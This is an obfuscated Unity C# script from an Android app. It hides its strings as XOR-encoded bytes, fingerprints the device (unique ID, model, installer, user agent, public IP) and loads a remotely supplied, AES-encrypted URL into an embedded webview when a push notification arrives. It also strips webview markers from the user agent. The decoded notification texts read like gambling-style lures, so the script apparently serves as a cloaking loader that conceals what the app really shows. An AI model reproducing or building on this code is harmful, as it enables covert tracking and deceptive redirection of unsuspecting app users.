using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0x3858c973 : MonoBehaviour
{
    private bool _0x536c5b52 = false;
    internal bool _0x8a3d01a5(string _0x6a2ab903)
    {
        return _0x6a2ab903.StartsWith(_0x6da9ed2f._0x22ec74ef(new byte[9] { 219, 215, 196, 221, 211, 194, 140, 153, 153 }, 182), StringComparison.OrdinalIgnoreCase) || _0x6a2ab903.StartsWith(_0x6da9ed2f._0x22ec74ef(new byte[24] { 112, 108, 108, 104, 107, 34, 55, 55, 104, 116, 121, 97, 54, 127, 119, 119, 127, 116, 125, 54, 123, 119, 117, 55 }, 24), StringComparison.OrdinalIgnoreCase) || _0x6a2ab903.StartsWith(_0x6da9ed2f._0x22ec74ef(new byte[23] { 238, 242, 242, 246, 188, 169, 169, 246, 234, 231, 255, 168, 225, 233, 233, 225, 234, 227, 168, 229, 233, 235, 169 }, 134), StringComparison.OrdinalIgnoreCase);
    }

    private string Decrypt(string _0x99b4a120, string _0xe6fcdbf6)
    {
        try
        {
            var _0x8fbb086b = Convert.FromBase64String(_0x99b4a120);
            using var _0x8c00d91e = Aes.Create();
            _0x8c00d91e.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xe6fcdbf6));
            var _0xda7bb8e1 = new byte[16];
            Buffer.BlockCopy(_0x8fbb086b, 0, _0xda7bb8e1, 0, 16);
            _0x8c00d91e.IV = _0xda7bb8e1;
            using var _0x2b712a0e = new MemoryStream(_0x8fbb086b, 16, _0x8fbb086b.Length - 16);
            using var _0xbfedfcba = new CryptoStream(_0x2b712a0e, _0x8c00d91e.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0xca67abbe = new StreamReader(_0xbfedfcba, Encoding.UTF8);
            return _0xca67abbe.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    internal bool isApplicationFocus = false;
    internal bool IsHttpUrl(string _0xbb987a51)
    {
        if (string.IsNullOrEmpty(_0xbb987a51))
            return false;
        return _0xbb987a51.StartsWith(_0x6da9ed2f._0x22ec74ef(new byte[7] { 120, 100, 100, 96, 42, 63, 63 }, 16), StringComparison.OrdinalIgnoreCase) || _0xbb987a51.StartsWith(_0x6da9ed2f._0x22ec74ef(new byte[8] { 113, 109, 109, 105, 106, 35, 54, 54 }, 25), StringComparison.OrdinalIgnoreCase);
    }

    private string _0x3bf45c36 = "";
    private GameObject _0x631a365e;
    private void _0x4999ebd0()
    {
        _0xbbd2bc34 = true;
        if (_0xf540acea != null)
            _0xf540acea.SetUserAgent(_0xb53cbb25());
    }

    internal bool IsAboutBlank(string _0x8895f8bc)
    {
        if (string.IsNullOrEmpty(_0x8895f8bc))
            return false;
        return _0x8895f8bc.StartsWith(_0x6da9ed2f._0x22ec74ef(new byte[11] { 204, 207, 194, 216, 217, 151, 207, 193, 204, 195, 198 }, 173), StringComparison.OrdinalIgnoreCase);
    }

    private string _0x53aebe70 = "";
    private string _0xdb6e618e { get; set; }

    private void _0xdb23701e()
    {
        WLog(_0x6da9ed2f._0x22ec74ef(new byte[21] { 208, 249, 234, 252, 239, 249, 234, 253, 184, 250, 249, 251, 243, 184, 232, 234, 253, 235, 235, 253, 252 }, 152));
        if (Time.frameCount == _0xf883fed1)
            return;
        _0xf883fed1 = Time.frameCount;
        if (_0xd1bd4f25())
            return;
        _0x5a3564f6();
    }

    private async Task<bool> _0xa27640f8(int _0x624b872e = 5, int _0x78f0fd38 = 500)
    {
        List<EntityData> _0x3f232f38 = new List<EntityData>();
        int _0x5c9cd88a = 0;
        do
        {
            try
            {
                _0x3f232f38 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x6da9ed2f._0x22ec74ef(new byte[8] { 247, 235, 230, 254, 226, 245, 206, 227 }, 135), _0x35308c09, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x6da9ed2f._0x22ec74ef(new byte[9] { 138, 144, 179, 145, 138, 149, 130, 128, 154 }, 227) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[32] { 198, 201, 248, 238, 233, 192, 189, 236, 232, 248, 239, 228, 220, 238, 228, 243, 254, 207, 248, 238, 232, 241, 233, 238, 189, 248, 239, 239, 242, 239, 167, 189 }, 157) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0x78f0fd38);
        }
        while (_0x3f232f38.Count == 0 && _0x5c9cd88a++ < _0x624b872e);
        {
#if B_LOGS
            {
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[32] { 64, 79, 126, 104, 111, 70, 59, 82, 104, 75, 105, 114, 109, 122, 120, 98, 59, 74, 110, 126, 105, 98, 59, 105, 126, 104, 110, 119, 111, 104, 33, 59 }, 27) + JsonConvert.SerializeObject(_0x3f232f38, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[38] { 40, 39, 22, 0, 7, 46, 83, 58, 0, 35, 1, 26, 5, 18, 16, 10, 83, 34, 6, 22, 1, 10, 83, 1, 22, 0, 6, 31, 7, 0, 83, 16, 28, 6, 29, 7, 73, 83 }, 115) + _0x3f232f38.Count);
            }
#endif
        }

        bool _0x485695c3 = true;
        if (_0x3f232f38.Count == 0)
        {
            _0x485695c3 = false;
        }
        else
        {
            _0x485695c3 = _0x3f232f38.Any(_0x2a158a20 => _0x2a158a20.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[25] { 253, 242, 195, 213, 210, 251, 134, 239, 213, 246, 212, 207, 208, 199, 197, 223, 134, 212, 195, 213, 211, 202, 210, 156, 134 }, 166) + _0x485695c3);
            }
#endif
        }

        return _0x485695c3;
    }

    private IEnumerator _0x18c20556()
    {
        yield return RequestAndroidPermissionIfNeeded(Permission.Camera);
    }

    private async Task<string> _0xea84aa52(int _0x8fe88833 = 5, int _0x19306761 = 500)
    {
        try
        {
            List<EntityData> _0x1aef23d3 = new List<EntityData>();
            int _0xd150a6c5 = 0;
            do
            {
                _0x1aef23d3 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x6da9ed2f._0x22ec74ef(new byte[8] { 187, 167, 170, 178, 174, 185, 130, 175 }, 203), _0x35308c09, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x35308c09 }), new QueryOptions())).ToList();
                await Task.Delay(_0x19306761);
            }
            while (_0x1aef23d3.Count == 0 && _0xd150a6c5++ < _0x8fe88833);
            {
#if B_LOGS
                {
                    Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[33] { 14, 1, 48, 38, 33, 8, 117, 6, 52, 35, 48, 49, 117, 25, 60, 59, 62, 117, 4, 32, 48, 39, 44, 117, 39, 48, 38, 32, 57, 33, 38, 111, 117 }, 85) + JsonConvert.SerializeObject(_0x1aef23d3, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[39] { 108, 99, 82, 68, 67, 106, 23, 100, 86, 65, 82, 83, 23, 123, 94, 89, 92, 23, 102, 66, 82, 69, 78, 23, 69, 82, 68, 66, 91, 67, 68, 23, 84, 88, 66, 89, 67, 13, 23 }, 55) + _0x1aef23d3.Count);
                }
#endif
            }

            var _0x065b7622 = _0x1aef23d3.SelectMany(_0x2a158a20 => _0x2a158a20.Data).FirstOrDefault(_0xd0ca709f => _0xd0ca709f.Key == _0x35308c09)?.Value.GetAs<string>() ?? string.Empty;
            _0x065b7622 = Decrypt(_0x065b7622, _0x35308c09);
            {
#if B_LOGS
                {
                    Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[24] { 230, 233, 216, 206, 201, 224, 157, 241, 210, 220, 217, 157, 206, 220, 203, 216, 217, 157, 209, 212, 211, 214, 135, 157 }, 189) + _0x065b7622);
                }
#endif
            }

            return _0x065b7622;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[39] { 83, 92, 109, 123, 124, 85, 40, 79, 109, 124, 40, 103, 122, 40, 120, 105, 122, 123, 109, 40, 123, 105, 126, 109, 108, 40, 100, 97, 102, 99, 40, 110, 105, 97, 100, 109, 108, 50, 40 }, 8) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    private string _0x009c2d65 { get; set; }

    private string _0xa91de751 = "";
    private string _0xfacbd605 = "";
    internal Button _0xb23d508c(string _0x6f35c245, Transform _0x4db264aa)
    {
        var _0xb5e7e226 = new GameObject(_0x6f35c245 + _0x6da9ed2f._0x22ec74ef(new byte[3] { 210, 228, 254 }, 144), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0xdc267945 = _0xb5e7e226.GetComponent<RectTransform>();
        _0xdc267945.SetParent(_0x4db264aa, false);
        var _0xdad55d95 = _0xb5e7e226.GetComponent<Image>();
        _0xdad55d95.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0xf632c340 = _0xb5e7e226.GetComponent<Button>();
        var _0x22c9cb8e = _0xf632c340.colors;
        _0x22c9cb8e.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0x22c9cb8e.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0xf632c340.colors = _0x22c9cb8e;
        var _0x6609a784 = new GameObject(_0x6da9ed2f._0x22ec74ef(new byte[4] { 224, 209, 204, 192 }, 180), typeof(RectTransform), typeof(Text));
        var _0x30e5fff7 = _0x6609a784.GetComponent<RectTransform>();
        _0x30e5fff7.SetParent(_0xb5e7e226.transform, false);
        _0x30e5fff7.anchorMin = Vector2.zero;
        _0x30e5fff7.anchorMax = Vector2.one;
        _0x30e5fff7.offsetMin = _0x30e5fff7.offsetMax = Vector2.zero;
        var _0x62109a45 = _0x6609a784.GetComponent<Text>();
        _0x62109a45.text = _0x6f35c245;
        _0x62109a45.alignment = TextAnchor.MiddleCenter;
        _0x62109a45.color = Color.black;
        _0x62109a45.font = Resources.GetBuiltinResource<Font>(_0x6da9ed2f._0x22ec74ef(new byte[9] { 153, 170, 177, 185, 180, 246, 172, 172, 190 }, 216));
        _0x62109a45.fontSize = 28;
        WLog(_0x6da9ed2f._0x22ec74ef(new byte[14] { 169, 152, 143, 139, 158, 143, 168, 159, 158, 158, 133, 132, 202, 205 }, 234) + _0x6f35c245 + _0x6da9ed2f._0x22ec74ef(new byte[1] { 29 }, 58));
        return _0xf632c340;
    }

    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0x24757086()
    {
        var _0x279fd3b1 = _0x6da9ed2f._0x22ec74ef(new byte[40] { 136, 148, 148, 144, 147, 218, 207, 207, 151, 151, 151, 206, 131, 140, 143, 149, 132, 134, 140, 129, 146, 133, 206, 131, 143, 141, 207, 131, 132, 142, 205, 131, 135, 137, 207, 148, 146, 129, 131, 133 }, 224);
        using (UnityWebRequest _0x0716d4ae = UnityWebRequest.Get(_0x279fd3b1))
        {
            await _0x0716d4ae.SendWebRequest();
            string[] _0x35baa3af = _0x0716d4ae.downloadHandler.text.Split('\n');
            foreach (string _0xd85990e4 in _0x35baa3af)
            {
                if (_0xd85990e4.StartsWith(_0x6da9ed2f._0x22ec74ef(new byte[3] { 237, 244, 185 }, 132)))
                {
                    string _0xdc2db896 = _0xd85990e4.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0xdc2db896} from {_0x279fd3b1}");
                        }
#endif
                    }

                    return _0xdc2db896;
                }
            }
        }

        return "";
    }

    private void _0x9025b58d(string _0x5ee669f7)
    {
        _0x6c3efd71();
        StartCoroutine(_0x70c809d3(_0x5ee669f7));
    }

    private void OnApplicationPause(bool _0xb84c585a)
    {
        isApplicationPause = _0xb84c585a;
    }

    private JObject BuildRandomPayload(params string[] _0xbae1810b)
    {
        JObject _0xd1000141 = new JObject();
        foreach (var _0xd33e89ba in _0xbae1810b)
        {
            string _0xcb5ea604 = _0xfb7edd4a();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0xcb5ea604} val={_0xd33e89ba}");
#endif
            }

            _0xd1000141.Add(_0xcb5ea604, _0xd33e89ba == null ? "" : _0xd33e89ba);
        }

        return _0xd1000141;
    }

    private string _0xb53cbb25()
    {
        if (string.IsNullOrEmpty(_0x77da62ef) && _0xf540acea != null)
            _0x77da62ef = _0xf540acea.GetUserAgent();
        if (string.IsNullOrEmpty(_0x77da62ef))
            return string.Empty;
        string _0x7ea1e61f = Regex.Replace(_0x77da62ef, _0x6da9ed2f._0x22ec74ef(new byte[11] { 111, 64, 25, 8, 111, 64, 25, 68, 69, 111, 81 }, 51), string.Empty);
        _0x7ea1e61f = Regex.Replace(_0x7ea1e61f, _0x6da9ed2f._0x22ec74ef(new byte[15] { 24, 55, 111, 6, 49, 45, 40, 32, 107, 31, 26, 127, 109, 25, 111 }, 68), string.Empty);
        _0x7ea1e61f = Regex.Replace(_0x7ea1e61f, _0x6da9ed2f._0x22ec74ef(new byte[15] { 22, 37, 50, 51, 41, 47, 46, 111, 116, 28, 110, 112, 28, 51, 106 }, 64), string.Empty);
        return Regex.Replace(_0x7ea1e61f, _0x6da9ed2f._0x22ec74ef(new byte[6] { 185, 150, 158, 215, 201, 152 }, 229), _0x6da9ed2f._0x22ec74ef(new byte[1] { 179 }, 147)).Trim();
    }

    private IEnumerator _0xbe82c8ae(Dictionary<string, object> _0x471ec396)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[30] { 168, 167, 150, 128, 135, 174, 211, 181, 150, 135, 144, 155, 211, 182, 139, 135, 129, 146, 211, 163, 134, 128, 155, 211, 183, 146, 135, 146, 201, 211 }, 243) + string.Join(_0x6da9ed2f._0x22ec74ef(new byte[1] { 66 }, 75), _0x471ec396));
#endif
            }
        }

        string _0xb3303e90 = "";
        // Primary source: nested JSON under "notificationData"
        if (_0x471ec396 != null && _0x471ec396.TryGetValue(_0x6da9ed2f._0x22ec74ef(new byte[16] { 75, 74, 81, 76, 67, 76, 70, 68, 81, 76, 74, 75, 97, 68, 81, 68 }, 37), out var raw))
        {
            try
            {
                var _0x32b26c90 = raw?.ToString();
                var _0x3b6d37f7 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x32b26c90);
                if (_0x3b6d37f7 != null && _0x3b6d37f7.TryGetValue(_0x6da9ed2f._0x22ec74ef(new byte[6] { 30, 8, 3, 9, 4, 9 }, 109), out var val))
                {
                    _0xb3303e90 = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x6da9ed2f._0x22ec74ef(new byte[30] { 45, 34, 19, 5, 2, 86, 38, 3, 5, 30, 43, 86, 60, 37, 57, 56, 86, 6, 23, 4, 5, 19, 86, 19, 4, 4, 25, 4, 76, 86 }, 118) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0xb3303e90) && _0x471ec396 != null && _0x471ec396.TryGetValue(_0x6da9ed2f._0x22ec74ef(new byte[6] { 254, 232, 227, 233, 228, 233 }, 141), out var lab))
        {
            _0xb3303e90 = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[38] { 152, 151, 166, 176, 183, 227, 147, 182, 176, 171, 158, 227, 133, 166, 183, 160, 171, 166, 167, 227, 176, 166, 173, 167, 170, 167, 227, 165, 177, 172, 174, 227, 169, 176, 172, 173, 249, 227 }, 195) + _0xb3303e90);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0xb3303e90))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[38] { 189, 178, 131, 149, 146, 198, 182, 147, 149, 142, 187, 198, 177, 135, 143, 146, 198, 146, 137, 198, 137, 150, 131, 136, 198, 145, 143, 146, 142, 198, 149, 131, 136, 130, 143, 130, 220, 198 }, 230) + _0xb3303e90);
            }
#endif
        }

        _0x3c18429d = _0xb3303e90;
        yield return new WaitUntil(() => _0xf67969c4);
        var _0xe7f2c5c0 = _0xea84aa52(2, 100);
        yield return new WaitUntil(() => _0xe7f2c5c0.IsCompleted);
        string _0xbbb6d238 = _0xe7f2c5c0.Result;
        if (!string.IsNullOrEmpty(_0xbbb6d238))
        {
            string _0xd1836101 = _0x8dc33c89(_0xbbb6d238, _0xb3303e90);
            {
#if B_LOGS
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[33] { 146, 157, 172, 186, 189, 233, 153, 188, 186, 161, 148, 233, 155, 172, 165, 166, 168, 173, 233, 158, 172, 171, 159, 160, 172, 190, 233, 190, 160, 189, 161, 243, 233 }, 201) + _0xd1836101);
#endif
            }

            _0xf540acea.Load(_0xd1836101);
        }
    }

    private bool _0x24862266 = false;
    private string _0xb53756c6 = "";
    private string GetFailingUrl(UniWebViewNativeResultPayload _0x329fd128)
    {
        if (_0x329fd128 == null || _0x329fd128.Extra == null)
            return null;
        object _0xe206d204;
        if (!_0x329fd128.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0xe206d204))
            return null;
        return _0xe206d204 as string;
    }

    private readonly string[] _0x6af161b0 = new string[]
    {
        _0x6da9ed2f._0x22ec74ef(new byte[60] { 230, 137, 152, 166, 54, 66, 126, 115, 54, 100, 115, 115, 122, 101, 54, 119, 100, 115, 54, 126, 121, 98, 54, 100, 127, 113, 126, 98, 54, 120, 121, 97, 54, 244, 150, 133, 54, 114, 121, 120, 244, 150, 143, 98, 54, 123, 127, 101, 101, 54, 111, 121, 99, 100, 54, 101, 102, 127, 120, 55 }, 22),
        _0x6da9ed2f._0x22ec74ef(new byte[52] { 92, 51, 33, 44, 140, 229, 216, 140, 207, 195, 217, 192, 200, 140, 206, 201, 140, 213, 195, 217, 222, 140, 192, 217, 207, 199, 213, 140, 193, 195, 193, 201, 194, 216, 140, 78, 44, 63, 140, 219, 196, 213, 140, 223, 216, 195, 220, 140, 194, 195, 219, 147 }, 172),
        _0x6da9ed2f._0x22ec74ef(new byte[66] { 102, 30, 37, 107, 60, 11, 164, 198, 237, 227, 164, 243, 237, 234, 247, 164, 229, 246, 225, 164, 236, 237, 240, 240, 237, 234, 227, 164, 233, 235, 246, 225, 164, 235, 226, 240, 225, 234, 164, 240, 235, 224, 229, 253, 164, 102, 4, 23, 164, 247, 240, 229, 253, 164, 237, 234, 164, 240, 236, 225, 164, 227, 229, 233, 225, 170 }, 132),
        _0x6da9ed2f._0x22ec74ef(new byte[54] { 233, 134, 140, 139, 57, 77, 113, 112, 106, 57, 112, 106, 57, 105, 107, 112, 116, 124, 57, 109, 112, 116, 124, 57, 251, 153, 138, 57, 109, 113, 124, 57, 123, 124, 106, 109, 57, 105, 117, 120, 96, 124, 107, 106, 57, 105, 117, 120, 96, 57, 119, 118, 110, 55 }, 25),
        _0x6da9ed2f._0x22ec74ef(new byte[48] { 109, 2, 9, 56, 189, 196, 242, 232, 239, 189, 234, 244, 243, 243, 244, 243, 250, 189, 238, 233, 239, 248, 252, 246, 189, 254, 242, 232, 241, 249, 189, 255, 248, 189, 242, 243, 248, 189, 238, 237, 244, 243, 189, 252, 234, 252, 228, 179 }, 157),
        _0x6da9ed2f._0x22ec74ef(new byte[65] { 194, 173, 168, 178, 18, 120, 83, 81, 89, 66, 93, 70, 65, 18, 83, 64, 87, 18, 95, 93, 64, 87, 18, 83, 81, 70, 91, 68, 87, 18, 70, 93, 92, 91, 85, 90, 70, 18, 208, 178, 161, 18, 65, 70, 83, 75, 18, 83, 92, 86, 18, 70, 64, 75, 18, 75, 93, 71, 64, 18, 94, 71, 81, 89, 28 }, 50),
        _0x6da9ed2f._0x22ec74ef(new byte[55] { 231, 136, 153, 165, 55, 82, 97, 114, 101, 110, 55, 100, 103, 126, 121, 55, 116, 120, 98, 121, 99, 100, 55, 245, 151, 132, 55, 99, 127, 114, 55, 121, 114, 111, 99, 55, 120, 121, 114, 55, 116, 120, 98, 123, 115, 55, 117, 114, 55, 110, 120, 98, 101, 100, 57 }, 23),
        _0x6da9ed2f._0x22ec74ef(new byte[63] { 80, 31, 34, 93, 10, 61, 146, 226, 222, 211, 203, 215, 192, 193, 146, 192, 219, 213, 218, 198, 146, 220, 221, 197, 146, 211, 192, 215, 146, 197, 219, 220, 220, 219, 220, 213, 146, 80, 50, 33, 146, 214, 221, 220, 80, 50, 43, 198, 146, 197, 211, 222, 217, 146, 211, 197, 211, 203, 146, 203, 215, 198, 156 }, 178),
        _0x6da9ed2f._0x22ec74ef(new byte[51] { 69, 42, 58, 51, 149, 250, 219, 217, 204, 149, 193, 221, 218, 198, 208, 149, 194, 221, 218, 149, 198, 193, 212, 204, 149, 220, 219, 149, 193, 221, 208, 149, 210, 212, 216, 208, 149, 194, 220, 219, 149, 193, 221, 208, 149, 197, 199, 220, 207, 208, 155 }, 181),
        _0x6da9ed2f._0x22ec74ef(new byte[64] { 216, 160, 155, 213, 130, 181, 26, 119, 85, 87, 95, 84, 78, 79, 87, 26, 83, 73, 26, 95, 76, 95, 72, 67, 78, 82, 83, 84, 93, 26, 216, 186, 169, 26, 81, 95, 95, 74, 26, 73, 74, 83, 84, 84, 83, 84, 93, 26, 92, 85, 72, 26, 67, 85, 79, 72, 26, 89, 82, 91, 84, 89, 95, 20 }, 58)
    };
    private RectTransform _0x43a38e59;
    // NATIVE WEB VIEW METHODS
    private UniWebView _0xf540acea = null;
    private void _0x5cd41a40()
    {
        {
#if B_LOGS
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[22] { 161, 174, 159, 137, 142, 167, 218, 169, 142, 149, 136, 159, 190, 159, 140, 147, 153, 159, 179, 148, 156, 149 }, 250));
#endif
        }

        _0x45d5a482 = SystemInfo.deviceModel;
        _0x3bf45c36 = Application.version;
        _0xa7912803 = Application.installMode;
        _0xa346f20e = Application.installerName;
        _0xdec57d0b = Application.identifier;
        _0xd6df64f4 = _0x8a4b65ee();
        _0x77da62ef = _0xdbccb605();
        _0x61702eb6 = SystemInfo.deviceUniqueIdentifier;
        _0x6296a8c7 = SystemInfo.graphicsDeviceName;
        _0x56f1f529 = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x3bf45c36 = _0x6da9ed2f._0x22ec74ef(new byte[5] { 71, 94, 71, 94, 71 }, 112);
                _0xa7912803 = ApplicationInstallMode.Store;
                _0xa346f20e = _0x6da9ed2f._0x22ec74ef(new byte[19] { 179, 191, 189, 254, 177, 190, 180, 162, 191, 185, 180, 254, 166, 181, 190, 180, 185, 190, 183 }, 208);
                _0x77da62ef = _0x6da9ed2f._0x22ec74ef(new byte[8] { 116, 124, 97, 101, 104, 49, 100, 112 }, 17);
                _0x61702eb6 = Guid.NewGuid().ToString().Replace(_0x6da9ed2f._0x22ec74ef(new byte[1] { 169 }, 132), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[17] { 218, 213, 228, 242, 245, 220, 161, 229, 228, 247, 204, 238, 229, 228, 237, 187, 161 }, 129) + _0x45d5a482);
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[19] { 144, 159, 174, 184, 191, 150, 235, 170, 187, 187, 157, 174, 185, 184, 162, 164, 165, 241, 235 }, 203) + _0x3bf45c36);
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[20] { 135, 136, 185, 175, 168, 129, 252, 181, 178, 175, 168, 189, 176, 176, 145, 179, 184, 185, 230, 252 }, 220) + _0xa7912803);
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[23] { 254, 241, 192, 214, 209, 248, 133, 204, 203, 214, 209, 196, 201, 201, 192, 215, 246, 209, 202, 215, 192, 159, 133 }, 165) + _0xa346f20e);
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[14] { 209, 222, 239, 249, 254, 215, 170, 235, 250, 250, 195, 238, 176, 170 }, 138) + _0xdec57d0b);
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[14] { 191, 176, 129, 151, 144, 185, 196, 133, 128, 146, 173, 128, 222, 196 }, 228) + _0xd6df64f4);
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[18] { 49, 62, 15, 25, 30, 55, 74, 31, 25, 15, 24, 43, 13, 15, 4, 30, 80, 74 }, 106) + _0x77da62ef);
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[17] { 2, 13, 60, 42, 45, 4, 121, 42, 32, 42, 29, 60, 47, 16, 61, 99, 121 }, 89) + _0x61702eb6);
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[12] { 251, 244, 197, 211, 212, 253, 128, 199, 208, 213, 154, 128 }, 160) + _0x6296a8c7);
